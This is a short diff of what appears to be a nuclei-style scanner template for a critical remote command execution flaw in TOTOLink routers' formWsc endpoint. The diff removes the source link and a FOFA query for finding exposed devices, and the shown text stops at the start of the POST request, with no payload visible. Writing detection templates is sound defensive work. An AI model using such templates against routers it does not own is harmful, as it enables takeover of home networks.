@@ -3,12 +3,8 @@ info:
   name: TOTOLink formWsc存在远程命令执行漏洞.docx
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kpdgagltwyewwyrl'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kpdgagltwyewwyrl
-    fofa: title="TOTOLINK"
 http:
 - raw:
   - 'POST /boaform/formWsc HTTP/1.1
